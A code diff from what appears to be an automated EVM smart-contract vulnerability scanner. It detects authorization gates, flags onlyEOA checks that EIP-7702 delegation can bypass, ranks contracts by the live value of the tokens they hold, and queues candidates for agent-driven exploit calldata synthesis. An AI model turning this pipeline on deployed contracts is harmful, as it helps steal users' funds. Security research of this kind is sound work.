+        u_p_hi_d = price_max_dec_map.get(tn, _to_dec(price_max_map.get(tn, u_p_d)))
+        return (Decimal(amt) / (Decimal(10) ** dec_t)) * u_p_hi_d, u_p_d
+
+    mc_meta: List[Tuple[str, str, str]] = []
+    mc_out: List[Tuple[bool, bytes]] = []
+    if _is_live_lazy_s2:
+        bal_out = _exec_mc_queries(bal_queries)
+        positive_bal_pairs: Set[Tuple[str, str]] = set()
+        positive_toks: Set[str] = set()
+        for (_kind_b, actor_b, t_norm_b), (ok_b, rdata_b) in zip(bal_meta, bal_out):
+            if ok_b and len(rdata_b) >= 32 and int.from_bytes(rdata_b[:32], "big") > 0:
+                positive_bal_pairs.add((actor_b, t_norm_b))
+                positive_toks.add(t_norm_b)
+        allow_queries, allow_meta = _build_allow_queries(positive_bal_pairs)
+        allow_out = _exec_mc_queries(allow_queries)
+        mc_meta = bal_meta + allow_meta
+        mc_out = bal_out + allow_out
+        if positive_toks:
+            held_p_targets = sorted(positive_toks | ({_wn_bc} if _wn_bc else set()))
+            held_p_max: Dict[str, float] = {}
+            held_p_dec: Dict[str, Decimal] = {}
+            held_p_max_dec: Dict[str, Decimal] = {}
+            h_dec_m, h_price_m = _resolve_token_metadata_batch(
+                router,
+                c,
+                held_p_targets,
+                block_pin,
+                np_min_dec,
+                upper_prices_out=held_p_max,
+                native_price_max_usd=np_max_dec,
+                prices_dec_out=held_p_dec,
+                upper_prices_dec_out=held_p_max_dec,
+                skip_dex_probe=False,
+            )
+            dec_map.update(h_dec_m)
+            price_map.update(h_price_m)
+            price_max_map.update(held_p_max)
+            price_dec_map.update(held_p_dec)
+            price_max_dec_map.update(held_p_max_dec)
+            eff_price_dec_map.update({k: _to_dec(v) for k, v in h_price_m.items()})
+            eff_price_dec_map.update(held_p_dec)
+    else:
+        allow_queries, allow_meta = _build_allow_queries(None)
+        mc_queries = bal_queries + allow_queries
+        mc_meta = bal_meta + allow_meta
+        if mc_queries:
+            mc_out = _exec_mc_queries(mc_queries)
+
+    if mc_meta and mc_out:
         for (kind, actor, t_norm), (ok, rdata) in zip(mc_meta, mc_out):
             if not ok or len(rdata) < 32:
                 continue
@@ -14514,7 +14952,14 @@ def build_backward_trust_closure(
         (t_n, t_r, dec_map.get(t_n, 18), eff_price_dec_map.get(t_n, _DEC_ZERO))
         for t_n, t_r in ordered_held_toks
         if block_pin > 0 and not (t_n == wnative and np_max_dec > _DEC_ZERO)
+        and eff_price_dec_map.get(t_n, _DEC_ZERO) > _DEC_ZERO
     ]
+    if len(held_dex_specs) > 200:
+        held_dex_specs.sort(
+            key=lambda s: (Decimal(s[1]) / (Decimal(10) ** s[2])) * s[3] if s[3] > _DEC_ZERO else _DEC_ZERO,
+            reverse=True,
+        )
+        held_dex_specs = held_dex_specs[:200]
     held_dex_map = _parallel_dex_liquidity_probes(
         router,
         c,
@@ -14827,8 +15272,14 @@ for _intent_sig in (
     "executeBatch((uint8,address,uint256,bytes)[])",
     "fill((bytes32,address,uint256,uint256,uint256,address),bytes)",
     "executeIntent(bytes,bytes,bytes32,bytes)",
+    # ERC-7821 minimal batch executor execute(bytes32,bytes) - EIP-7702 delegation sink distinct from ERC-7579 executeBatch
+    "execute(bytes32,bytes)",
     # Uniswap V4 PoolManager.unlock(bytes) - hook unlock callback gateway (take/settle/balanceDelta coupling)
     "unlock(bytes)",
+    # ERC-7579 single execute(address,uint256,bytes) - EIP-7702 delegation single-call sink distinct from executeBatch
+    "execute(address,uint256,bytes)",
+    # CowSwap GPv2 settlement sink settle() - intent settlement entry with solver-signed orders
+    "settle()",
 ):
     VALUE_SINK_SELECTORS.add(_selector(_intent_sig).lower())
 
@@ -14858,6 +15309,15 @@ def quick_scan_value_sinks(code: bytes, cancun_active: bool = True) -> ValueSink
             all_branches_revert=True,
             early_exit_safe=False,
             early_exit_reason="E2_EMPTY_BYTECODE",
+        )
+    if _eip7702_delegate(code):
+        return ValueSinkScanResult(
+            has_s5_state_mutation=True,
+            all_branches_revert=False,
+            sink_pcs=[0],
+            sink_kinds=["S5_EIP7702_DELEGATION_REPLAY_RISK"],
+            early_exit_safe=False,
+            early_exit_reason="",
         )
     dis = _disassemble(code)
     if not dis:
@@ -15025,6 +15485,7 @@ class BasicBlock:
     time_guarded_slots: Set[int] = field(default_factory=set)
     has_ecrecover: bool = False
     has_calldata_auth_eq: bool = False
+    has_eoa_only_gate: bool = False
 
 
 @dataclass
@@ -15051,6 +15512,7 @@ class EntryPointCFG:
     has_time_bypass: bool = False
     has_ecrecover_guard: bool = False
     has_tainted_calldata_auth: bool = False
+    has_eoa_only_gate: bool = False
 
 
 @dataclass
@@ -15258,14 +15720,18 @@ def _simulate_bb_symbolic(
     cond_caller: Optional[Tuple[str, str, Optional[int], int]] = None
     cond_caller_map: Optional[bool] = None
     cond_time: Optional[Tuple[bool, int]] = None
-    jump_caller_arg: Optional[Tuple[str, str, Optional[int], int, int]] = None
-    jump_caller_map_arg: Optional[Tuple[bool, int]] = None
-    jump_time_arg: Optional[Tuple[bool, int, int]] = None
+    jump_caller_arg: Optional[Tuple[str, str, Optional[int], int, int, bool]] = None
+    jump_caller_map_arg: Optional[Tuple[bool, int, bool]] = None
+    jump_time_arg: Optional[Tuple[bool, int, int, bool]] = None
     sload_map_bases: List[int] = []
     sstore_map_bases: List[int] = []
     abi_hints: Dict[int, str] = {}
     has_dyn_bytes = False
     saw_call_in_block = False
+    saw_calldata_auth_eq = False
+    saw_ecrecover_blk = False
+    saw_eoa_only_gate = False
+    saw_time_slots: Set[int] = set()
     mem_caller_hint = any(k in (0, 32) and v == "CALLER" for k, v in mem_map.items())
 
     for _, op_nm, imm in bb.insns:
@@ -15491,6 +15957,10 @@ def _simulate_bb_symbolic(
         elif op_nm in ("BALANCE", "EXTCODESIZE", "EXTCODEHASH"):
             addr_ext = sym_stack.pop() if sym_stack else "UNK"
             _record_abi_hint(abi_hints, _cd_param_slot(addr_ext), "address")
+            if op_nm in ("EXTCODESIZE", "EXTCODEHASH") and addr_ext in ("CALLER", "ORIGIN"):
+                saw_eoa_only_gate = True
+                if mutate_bb:
+                    bb.has_eoa_only_gate = True
             sym_stack.append("UNK")
         elif op_nm == "SLOAD":
             if mutate_bb:
@@ -15550,6 +16020,12 @@ def _simulate_bb_symbolic(
             if a == "CALLER" or b == "CALLER":
                 other = b if a == "CALLER" else a
                 guard_suffix = ""
+                if other == "ORIGIN":
+                    saw_eoa_only_gate = True
+                    if mutate_bb:
+                        bb.has_eoa_only_gate = True
+                    sym_stack.append("CMP_EOA_ONLY")
+                    continue
                 if other.startswith("CONST20:"):
                     c_val = int(other[8:])
                     if 0 <= c_val <= _ADDR_MASK_160:
@@ -15578,11 +16054,15 @@ def _simulate_bb_symbolic(
                 cd_a = _is_cd_sym(a, include_selector_word=False)
                 cd_b = _is_cd_sym(b, include_selector_word=False)
                 if (cd_a or cd_b) and (b if cd_a else a).startswith(("SLOAD:", "SLOAD_PACKED:", "CONST20:")):
-                    bb.has_calldata_auth_eq = True
+                    saw_calldata_auth_eq = True
+                    if mutate_bb:
+                        bb.has_calldata_auth_eq = True
                 if a == "ECRECOVER_RET" or b == "ECRECOVER_RET":
                     other_e = b if a == "ECRECOVER_RET" else a
                     if other_e.startswith(("SLOAD:", "SLOAD_PACKED:", "CONST20:", "CALLER")):
-                        bb.has_ecrecover = True
+                        saw_ecrecover_blk = True
+                        if mutate_bb:
+                            bb.has_ecrecover = True
                         sym_stack.append("CMP_ECRECOVER")
                         continue
                 sym_stack.append("CMP_OTHER")
@@ -15624,7 +16104,9 @@ def _simulate_bb_symbolic(
                                 t_sl_c = val_t
                                 break
                 if t_sl_c >= 0:
-                    bb.time_guarded_slots.add(t_sl_c)
+                    saw_time_slots.add(t_sl_c)
+                    if mutate_bb:
+                        bb.time_guarded_slots.add(t_sl_c)
                 sym_stack.append(f"CMP_TIME|{t_sl_c}")
             else:
                 sym_stack.append("CMP_OTHER")
@@ -15718,26 +16200,29 @@ def _simulate_bb_symbolic(
                 if t_pc in jumpdests:
                     jump_target_pc = t_pc
                     cand_arg = ""
+                    cand_at_top = True
                     if sym_stack and _parse_caller_cond_sym(sym_stack[-1]) is not None:
                         cand_arg = sym_stack[-1]
+                        cand_at_top = True
                     elif len(sym_stack) >= 2 and _const_sym_int(sym_stack[-1]) in jumpdests and _parse_caller_cond_sym(sym_stack[-2]) is not None:
                         cand_arg = sym_stack[-2]
+                        cand_at_top = False
                     if cand_arg:
                         p_j_cond = _parse_caller_cond_sym(cand_arg)
                         if p_j_cond is not None:
-                            jump_caller_arg = (*p_j_cond, t_pc)
+                            jump_caller_arg = (*p_j_cond, t_pc, cand_at_top)
                     elif sym_stack and sym_stack[-1] in ("BOOL_CALLER_MAP", "NOT_BOOL_CALLER_MAP", "CALLER_EXTCALL_RET", "NOT_CALLER_EXTCALL_RET"):
-                        jump_caller_map_arg = (sym_stack[-1] in ("BOOL_CALLER_MAP", "CALLER_EXTCALL_RET"), t_pc)
+                        jump_caller_map_arg = (sym_stack[-1] in ("BOOL_CALLER_MAP", "CALLER_EXTCALL_RET"), t_pc, True)
                     elif len(sym_stack) >= 2 and _const_sym_int(sym_stack[-1]) in jumpdests and sym_stack[-2] in ("BOOL_CALLER_MAP", "NOT_BOOL_CALLER_MAP", "CALLER_EXTCALL_RET", "NOT_CALLER_EXTCALL_RET"):
-                        jump_caller_map_arg = (sym_stack[-2] in ("BOOL_CALLER_MAP", "CALLER_EXTCALL_RET"), t_pc)
+                        jump_caller_map_arg = (sym_stack[-2] in ("BOOL_CALLER_MAP", "CALLER_EXTCALL_RET"), t_pc, False)
                     elif sym_stack and sym_stack[-1].startswith(("CMP_TIME|", "NOT_CMP_TIME|")):
                         _ts_raw = sym_stack[-1]
                         _ts_sl = int(_ts_raw.split("|", 1)[1]) if _ts_raw.split("|", 1)[1].lstrip("-").isdigit() else -1
-                        jump_time_arg = (not _ts_raw.startswith("NOT_"), _ts_sl, t_pc)
+                        jump_time_arg = (not _ts_raw.startswith("NOT_"), _ts_sl, t_pc, True)
                     elif len(sym_stack) >= 2 and _const_sym_int(sym_stack[-1]) in jumpdests and sym_stack[-2].startswith(("CMP_TIME|", "NOT_CMP_TIME|")):
                         _ts_raw = sym_stack[-2]
                         _ts_sl = int(_ts_raw.split("|", 1)[1]) if _ts_raw.split("|", 1)[1].lstrip("-").isdigit() else -1
-                        jump_time_arg = (not _ts_raw.startswith("NOT_"), _ts_sl, t_pc)
+                        jump_time_arg = (not _ts_raw.startswith("NOT_"), _ts_sl, t_pc, False)
                 elif mutate_bb:
                     bb.has_unresolved_jump = True
             elif dst != "ENTRY_RET" and mutate_bb:
@@ -15788,6 +16273,10 @@ def _simulate_bb_symbolic(
         "sstore_map_bases": sstore_map_bases,
         "abi_hints": abi_hints,
         "has_dyn_bytes": has_dyn_bytes,
+        "saw_calldata_auth_eq": saw_calldata_auth_eq,
+        "saw_ecrecover": saw_ecrecover_blk,
+        "saw_eoa_only_gate": saw_eoa_only_gate,
+        "saw_time_slots": saw_time_slots,
     }
 
 
@@ -15844,10 +16333,10 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
     blocks: Dict[int, BasicBlock] = {}
     raw_caller_cond: Dict[int, Tuple[str, str, Optional[int], int, Optional[int], Optional[int]]] = {}
     raw_caller_map_cond: Dict[int, Tuple[bool, Optional[int], Optional[int]]] = {}
-    raw_jump_caller_arg: Dict[int, Tuple[str, str, Optional[int], int, int]] = {}
-    raw_jump_caller_map_arg: Dict[int, Tuple[bool, int]] = {}
+    raw_jump_caller_arg: Dict[int, Tuple[str, str, Optional[int], int, int, bool]] = {}
+    raw_jump_caller_map_arg: Dict[int, Tuple[bool, int, bool]] = {}
     raw_time_cond: Dict[int, Tuple[bool, int, Optional[int], Optional[int]]] = {}
-    raw_jump_time_arg: Dict[int, Tuple[bool, int, int]] = {}
+    raw_jump_time_arg: Dict[int, Tuple[bool, int, int, bool]] = {}
     block_jump_targets: Dict[int, Optional[int]] = {}
     block_fallthrough_pcs: Dict[int, Optional[int]] = {}
     block_jump_dst_sym: Dict[int, str] = {}
@@ -16028,7 +16517,10 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
                 valid_preds = [p for p in bb2.preds if p not in entry_ret_blocks and p in flow_stacks]
                 if not valid_preds:
                     continue
-                all_preds_ready = all(p in flow_stacks for p in bb2.preds if p not in entry_ret_blocks)
+                all_preds_ready = (
+                    not any(p in entry_ret_blocks for p in bb2.preds)
+                    and all(p in flow_stacks for p in bb2.preds)
+                )
                 in_stk2 = _join_sym_stacks([flow_stacks[p] for p in valid_preds])
                 in_mem2 = _join_sym_mems([flow_mems.get(p, {}) for p in valid_preds])
                 if not in_stk2 and not in_mem2:
@@ -16051,6 +16543,14 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
                     _record_abi_hint(cur_h, sl_i, t_i)
             if sim2["has_dyn_bytes"]:
                 block_dyn_bytes.add(b_pc)
+            if sim2["saw_calldata_auth_eq"]:
+                bb2.has_calldata_auth_eq = True
+            if sim2["saw_ecrecover"]:
+                bb2.has_ecrecover = True
+            if sim2["saw_eoa_only_gate"]:
+                bb2.has_eoa_only_gate = True
+            if all_preds_ready and sim2["saw_time_slots"]:
+                bb2.time_guarded_slots.update(sim2["saw_time_slots"])
             if all_preds_ready and sim2["cond_caller"] is not None and b_pc not in raw_caller_cond:
                 last_nm2 = bb2.insns[-1][1] if bb2.insns else ""
                 if last_nm2 == "JUMPI":
@@ -16110,7 +16610,9 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
             if _branch_unconditionally_reverts(blocks, unauth_pc, entry_ret_blocks=entry_ret_blocks):
                 _set_bb_caller_gate(bb, g_const, g_slot, g_shift, auth_pc, unauth_pc)
 
-    def _verify_require_helper_block(helper_pc: int, is_true_on_auth: bool) -> Optional[int]:
+    def _verify_require_helper_block(
+        helper_pc: int, is_true_on_auth: bool, *, cond_at_top: bool = True
+    ) -> Optional[int]:
         h_bb = blocks.get(helper_pc)
         if h_bb is None or len(h_bb.insns) < 2 or h_bb.insns[-1][1] != "JUMPI":
             return None
@@ -16118,12 +16620,39 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
             return None
         if not all(nm in ("JUMPDEST", "ISZERO", "DUP1", "DUP2", "SWAP1", "SWAP2") for _, nm, _ in h_bb.insns[:-2]):
             return None
-        iszero_parity = sum(1 for _, nm, _ in h_bb.insns[:-2] if nm == "ISZERO") % 2
+        h_stk: List[str] = (
+            ["OTHER", "OTHER", "RET_PC", "COND"] if cond_at_top else ["OTHER", "OTHER", "COND", "RET_PC"]
+        )
+        for _, h_nm, _ in h_bb.insns[:-1]:
+            if h_nm == "JUMPDEST":
+                continue
+            elif h_nm.startswith("PUSH"):
+                h_stk.append("PUSH_CONST")
+            elif h_nm == "DUP1":
+                h_stk.append(h_stk[-1])
+            elif h_nm == "DUP2":
+                h_stk.append(h_stk[-2])
+            elif h_nm == "SWAP1":
+                h_stk[-1], h_stk[-2] = h_stk[-2], h_stk[-1]
+            elif h_nm == "SWAP2":
+                h_stk[-1], h_stk[-3] = h_stk[-3], h_stk[-1]
+            elif h_nm == "ISZERO":
+                top_h = h_stk.pop()
+                if top_h == "COND":
+                    h_stk.append("NOT_COND")
+                elif top_h == "NOT_COND":
+                    h_stk.append("COND")
+                else:
+                    h_stk.append("OTHER")
+            else:
+                return None
+        if len(h_stk) < 2 or h_stk[-1] != "PUSH_CONST" or h_stk[-2] not in ("COND", "NOT_COND"):
+            return None
         h_j = block_jump_targets.get(helper_pc)
         h_f = block_fallthrough_pcs.get(helper_pc)
         if h_j is None or h_f is None or h_j == h_f:
             return None
-        jumps_when_true = iszero_parity == 0
+        jumps_when_true = h_stk[-2] == "COND"
         jumps_on_auth = jumps_when_true if is_true_on_auth else (not jumps_when_true)
         h_auth, h_unauth = (h_j, h_f) if jumps_on_auth else (h_f, h_j)
         if not _branch_unconditionally_reverts(blocks, h_unauth, entry_ret_blocks=entry_ret_blocks):
@@ -16149,11 +16678,11 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
 
     # --via-ir 등 컴파일러가 `require(msg.sender == owner, ...)`의 bool 판별을 호출자 블록 끝에서 수행하고
     # (ret_pc, bool_cond)를 공용 require(bool) 헬퍼 JUMP 블록으로 넘기는 인라인 아웃라인 패턴 인식
-    for b_pc, (cond_kind, g_const, g_slot, g_shift, helper_pc) in raw_jump_caller_arg.items():
+    for b_pc, (cond_kind, g_const, g_slot, g_shift, helper_pc, cond_at_top) in raw_jump_caller_arg.items():
         bb = blocks[b_pc]
         if bb.has_caller_eq or bb.authorized_succ_pc is not None or bb.succs != [helper_pc]:
             continue
-        h_unauth = _verify_require_helper_block(helper_pc, cond_kind == "CMP_EQ_CALLER")
+        h_unauth = _verify_require_helper_block(helper_pc, cond_kind == "CMP_EQ_CALLER", cond_at_top=cond_at_top)
         if h_unauth is not None:
             _set_bb_caller_gate(bb, g_const, g_slot, g_shift, helper_pc, h_unauth)
 
@@ -16165,10 +16694,10 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
                 bb.has_caller_map_eq = True
                 bb.caller_map_auth_pc = auth_pc
 
-    for b_pc, (auth_when_true, helper_pc) in raw_jump_caller_map_arg.items():
+    for b_pc, (auth_when_true, helper_pc, cond_at_top) in raw_jump_caller_map_arg.items():
         bb = blocks[b_pc]
         if not bb.has_caller_map_eq and bb.succs == [helper_pc]:
-            if _verify_require_helper_block(helper_pc, auth_when_true) is not None:
+            if _verify_require_helper_block(helper_pc, auth_when_true, cond_at_top=cond_at_top) is not None:
                 bb.has_caller_map_eq = True
                 bb.caller_map_auth_pc = helper_pc
 
@@ -16189,12 +16718,12 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
             if t_slot >= 0:
                 bb.time_guarded_slots.add(t_slot)
 
-    for b_pc, (auth_when_true, t_slot, helper_pc) in raw_jump_time_arg.items():
+    for b_pc, (auth_when_true, t_slot, helper_pc, cond_at_top) in raw_jump_time_arg.items():
         bb = blocks[b_pc]
         if not bb.has_time_cond and bb.succs == [helper_pc]:
             if (
-                _verify_require_helper_block(helper_pc, auth_when_true) is not None
-                or _verify_require_helper_block(helper_pc, not auth_when_true) is not None
+                _verify_require_helper_block(helper_pc, auth_when_true, cond_at_top=cond_at_top) is not None
+                or _verify_require_helper_block(helper_pc, not auth_when_true, cond_at_top=cond_at_top) is not None
             ):
                 bb.has_time_cond = True
                 bb.time_auth_pc = helper_pc
@@ -16394,6 +16923,7 @@ def disassemble_and_build_cfg(code: bytes) -> CFGModel:
                     break
 
         ep.has_ecrecover_guard = any(blocks[c].has_ecrecover for c in visited if c in blocks)
+        ep.has_eoa_only_gate = any(blocks[c].has_eoa_only_gate for c in visited if c in blocks)
         ep.has_tainted_calldata_auth = (not ep.caller_dominated) and any(
             (blocks[c].has_calldata_auth_eq or blocks[c].has_untrusted_delegatecall)
             for c in visited
@@ -16790,7 +17320,12 @@ def _strip_pure_proxy_forward_fallback(cfg: CFGModel) -> CFGModel:
     if not saw_dcall or not has_trusted_impl_source:
         return cfg
     new_entries = {k: v for k, v in cfg.entries.items() if k != "fallback"}
-    return CFGModel(blocks=cfg.blocks, entries=new_entries, disassembly=cfg.disassembly)
+    return CFGModel(
+        blocks=cfg.blocks,
+        entries=new_entries,
+        disassembly=cfg.disassembly,
+        inferred_abi_by_sel=dict(cfg.inferred_abi_by_sel),
+    )
 
 
 def _build_res_facet_cfgs_for_e3(res: ProxyResolution, target_addr: str = "") -> List[CFGModel]:
@@ -16880,6 +17415,7 @@ def _merge_facet_cfgs(cfgs: Sequence[CFGModel]) -> CFGModel:
                 time_guarded_slots=set(bb.time_guarded_slots),
                 has_ecrecover=bb.has_ecrecover,
                 has_calldata_auth_eq=bb.has_calldata_auth_eq,
+                has_eoa_only_gate=bb.has_eoa_only_gate,
             )
         for sel, ep in c_model.entries.items():
             shifted_ep = EntryPointCFG(
@@ -16905,6 +17441,7 @@ def _merge_facet_cfgs(cfgs: Sequence[CFGModel]) -> CFGModel:
                 has_time_bypass=ep.has_time_bypass,
                 has_ecrecover_guard=ep.has_ecrecover_guard,
                 has_tainted_calldata_auth=ep.has_tainted_calldata_auth,
+                has_eoa_only_gate=ep.has_eoa_only_gate,
             )
             if sel not in merged_entries:
                 merged_entries[sel] = shifted_ep
@@ -16941,22 +17478,13 @@ def _merge_facet_cfgs(cfgs: Sequence[CFGModel]) -> CFGModel:
                     if not shifted_ep.caller_dominated:
                         prev_ep.caller_dominated = False
                     elif prev_ep.caller_dominated and prev_guard != cur_guard:
-                        merged_entries[f"{sel}@f{idx}"] = EntryPointCFG(
-                            selector=shifted_ep.selector,
-                            entry_pc=shifted_ep.entry_pc,
+                        merged_entries[f"{sel}@f{idx}"] = dataclasses.replace(
+                            shifted_ep,
                             reachable_blocks=set(shifted_ep.reachable_blocks),
-                            reaches_value_sink=shifted_ep.reaches_value_sink,
-                            reaches_sstore=shifted_ep.reaches_sstore,
-                            reaches_arbitrary_sstore=shifted_ep.reaches_arbitrary_sstore,
-                            reaches_keccak_sstore=shifted_ep.reaches_keccak_sstore,
-                            reaches_unresolved_jump=shifted_ep.reaches_unresolved_jump,
-                            reaches_dynamic_staticcall=shifted_ep.reaches_dynamic_staticcall,
                             written_slots=set(shifted_ep.written_slots),
                             read_slots=set(shifted_ep.read_slots),
-                            caller_dominated=shifted_ep.caller_dominated,
-                            dominator_guard_addr=shifted_ep.dominator_guard_addr,
-                            dominator_guard_slot=shifted_ep.dominator_guard_slot,
-                            dominator_guard_shift=shifted_ep.dominator_guard_shift,
+                            written_map_slots=set(shifted_ep.written_map_slots),
+                            read_map_slots=set(shifted_ep.read_map_slots),
                         )
                     prev_ep.reachable_blocks.update(shifted_ep.reachable_blocks)
                     prev_ep.reaches_value_sink = prev_ep.reaches_value_sink or shifted_ep.reaches_value_sink
@@ -16967,6 +17495,14 @@ def _merge_facet_cfgs(cfgs: Sequence[CFGModel]) -> CFGModel:
                     prev_ep.reaches_dynamic_staticcall = prev_ep.reaches_dynamic_staticcall or shifted_ep.reaches_dynamic_staticcall
                     prev_ep.written_slots.update(shifted_ep.written_slots)
                     prev_ep.read_slots.update(shifted_ep.read_slots)
+                    prev_ep.written_map_slots.update(shifted_ep.written_map_slots)
+                    prev_ep.read_map_slots.update(shifted_ep.read_map_slots)
+                    prev_ep.has_caller_map_guard = prev_ep.has_caller_map_guard and shifted_ep.has_caller_map_guard
+                    prev_ep.has_time_gate = prev_ep.has_time_gate and shifted_ep.has_time_gate
+                    prev_ep.has_time_bypass = prev_ep.has_time_bypass or shifted_ep.has_time_bypass
+                    prev_ep.has_ecrecover_guard = prev_ep.has_ecrecover_guard or shifted_ep.has_ecrecover_guard
+                    prev_ep.has_tainted_calldata_auth = prev_ep.has_tainted_calldata_auth or shifted_ep.has_tainted_calldata_auth
+                    prev_ep.has_eoa_only_gate = prev_ep.has_eoa_only_gate or shifted_ep.has_eoa_only_gate
         merged_dis.extend((pc + off, nm, imm) for pc, nm, imm in c_model.disassembly)
     return CFGModel(
         blocks=merged_blocks,
@@ -17380,7 +17916,8 @@ def slice_four_channel_causal_chains(
 
     for sk in sinks:
         dyn_sc_only = sk.reaches_dynamic_staticcall and not (sk.reaches_value_sink or sk.reaches_sstore)
-        has_verified_sel, in_t, complex_abi = _sel_abi_flags(sk.selector, dyn_sc_only)
+        eoa_only_7702 = bool(getattr(sk, "has_eoa_only_gate", False))
+        has_verified_sel, in_t, complex_abi = _sel_abi_flags(sk.selector, dyn_sc_only or eoa_only_7702)
         sk_names, sk_inf = _sel_extra_meta([sk.selector])
         slices.append(
             CausalSlice(
@@ -17392,19 +17929,28 @@ def slice_four_channel_causal_chains(
                 shared_map_slots=sorted(sk.read_map_slots & sk.written_map_slots)[:8],
                 witness_candidates=witnesses[:14],
                 repeat_counts=[1, 2],
-                rationale="Direct open entry reaching physical value, state, or dynamic staticcall sink",
+                rationale=(
+                    "Open entry with EIP-7702 bypassable onlyEOA gate (CALLER==ORIGIN / EXTCODESIZE)"
+                    if eoa_only_7702
+                    else "Direct open entry reaching physical value, state, or dynamic staticcall sink"
+                ),
                 leg_targets=[t_norm],
                 abi_inputs_by_sel={sk.selector: in_t} if has_verified_sel else {},
                 abi_param_names_by_sel=sk_names,
                 inferred_abi_by_sel=sk_inf,
+                prescreen_diagnostics=({"eoa_only_gate_eip7702_bypassable": True} if eoa_only_7702 else {}),
                 needs_agent_synthesis=complex_abi,
                 undecided_reason=(
-                    "Dynamic STATICCALL view/verifier callback synthesis required"
-                    if dyn_sc_only
+                    "EIP-7702 bypassable onlyEOA gate (CALLER==ORIGIN / EXTCODESIZE) requires delegated/EOA synthesis"
+                    if eoa_only_7702
                     else (
-                        "Unverified selector or fallback calldata synthesis required"
-                        if not has_verified_sel
-                        else ("Complex struct/bytes calldata synthesis required" if complex_abi else "")
+                        "Dynamic STATICCALL view/verifier callback synthesis required"
+                        if dyn_sc_only
+                        else (
+                            "Unverified selector or fallback calldata synthesis required"
+                            if not has_verified_sel
+                            else ("Complex struct/bytes calldata synthesis required" if complex_abi else "")
+                        )
                     )
                 ),
             )
@@ -17518,6 +18064,45 @@ def slice_four_channel_causal_chains(
 
     has_transient = any(bb.has_tstore or bb.has_tload for bb in cfg.blocks.values())
     if has_transient and sinks:
+        tstore_eps = [
+            ep for ep in open_eps
+            if any(b_pc in cfg.blocks and cfg.blocks[b_pc].has_tstore for b_pc in ep.reachable_blocks)
+        ]
+        tload_eps = [
+            ep for ep in sinks
+            if any(b_pc in cfg.blocks and cfg.blocks[b_pc].has_tload for b_pc in ep.reachable_blocks)
+        ]
+        t_cross_added = 0
+        for tw in tstore_eps[:4]:
+            for tr in tload_eps[:4]:
+                if tw.selector == tr.selector or t_cross_added >= 4:
+                    continue
+                t_abi = {
+                    s: abi_map[s.lower()]
+                    for s in (tw.selector, tr.selector)
+                    if s.lower() in abi_map and s.lower() != "fallback"
+                }
+                t_names, t_inf = _sel_extra_meta((tw.selector, tr.selector))
+                t_complex = (len(t_abi) < 2) or any(_abi_requires_agent_reasoning(v) for v in t_abi.values())
+                slices.append(
+                    CausalSlice(
+                        slice_id=f"ch_transient_x_{t_norm[-6:]}_{tw.selector}_{tr.selector}",
+                        target_address=t_norm,
+                        channel="CH_TRANSIENT",
+                        legs=[tw.selector, tr.selector],
+                        shared_slots=sorted(tw.written_slots & tr.read_slots)[:8],
+                        witness_candidates=witnesses[:10],
+                        repeat_counts=[1, 2],
+                        rationale="Cross-entry EIP-1153 transient storage (TSTORE -> TLOAD) same-tx residue coupling",
+                        leg_targets=[t_norm, t_norm],
+                        abi_inputs_by_sel=t_abi,
+                        abi_param_names_by_sel=t_names,
+                        inferred_abi_by_sel=t_inf,
+                        needs_agent_synthesis=t_complex,
+                        undecided_reason="Cross-entry EIP-1153 transient residue unverified or complex ABI" if t_complex else "",
+                    )
+                )
+                t_cross_added += 1
         for sk in sinks[:4]:
             has_verified_sel, in_t, complex_abi = _sel_abi_flags(sk.selector)
             sk_names_t, sk_inf_t = _sel_extra_meta([sk.selector])
@@ -17647,9 +18232,15 @@ def slice_four_channel_causal_chains(
 # ═══════════════════════════════════════════════════════════════════════════
 
 _VM_CAST_PREFIX_PAT: str = r"(?:Vm|IHevm|Hevm|StdCheats)\s*\((?:[^()]|\((?:[^()]|\([^()]*\))*\))*\)"
+_HEVM_INLINE_CAST_PREFIX_PAT: str = (
+    r"[A-Za-z_][A-Za-z0-9_]*\s*\((?:[^()]|\([^()]*\))*"
+    r"0x7109709[Ee][Cc]fa91a80626f[Ff]3989[Dd]68f67[Ff]5b1[Dd][Dd]12[Dd]"
+    r"(?:[^()]|\([^()]*\))*\)"
+)
 _VM_VAR_DECL_RE = re.compile(r"\bVm\s+(?:constant\s+|immutable\s+)?([A-Za-z_][A-Za-z0-9_]*)\b")
 _VM_CAST_ASSIGN_RE = re.compile(r"\b([A-Za-z_][A-Za-z0-9_]*)\s*=\s*Vm\s*\(")
 _VM_INLINE_CALL_RE = re.compile(rf"\b{_VM_CAST_PREFIX_PAT}\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(")
+_HEVM_INLINE_CAST_CALL_RE = re.compile(rf"\b{_HEVM_INLINE_CAST_PREFIX_PAT}\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)\s*\(")
 _LOWLEVEL_HEVM_RE = re.compile(
     r"0x7109709[Ee][Cc]fa91a80626f[Ff]3989[Dd]68f67[Ff]5b1[Dd][Dd]12[Dd]\s*\.\s*(?:call|staticcall|delegatecall)"
 )
@@ -17952,7 +18543,7 @@ def _compiled_vm_var_regexes(vm_key: Tuple[str, ...]) -> Tuple[re.Pattern[str], 
     return (
         re.compile(rf"\b(?:{var_pat})\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)\s*\("),
         re.compile(
-            rf"(?:\b(?:{var_pat})|\b{_VM_CAST_PREFIX_PAT})\s*\.\s*(?:prank|startPrank)\s*\("
+            rf"(?:\b(?:{var_pat})|\b{_VM_CAST_PREFIX_PAT}|\b{_HEVM_INLINE_CAST_PREFIX_PAT})\s*\.\s*(?:prank|startPrank)\s*\("
         ),
         re.compile(rf"\b(?:{var_pat})\b"),
     )
@@ -18042,13 +18633,14 @@ def verify_cheatcode_allowlist(
 
         if _HEVM_DERIVE_RE.search(clean_src):
             violations.append("disallowed_hevm_derivation_string")
-        if _CONSOLE_HEX_RE.search(clean_src) or _CONSOLE_DOT_RE.search(clean_src):
+        skel_stripped_src = _SOL_CONST_ADDR_DECL_RE.sub('""', clean_src)
+        if _CONSOLE_HEX_RE.search(skel_stripped_src) or _CONSOLE_DOT_RE.search(skel_stripped_src):
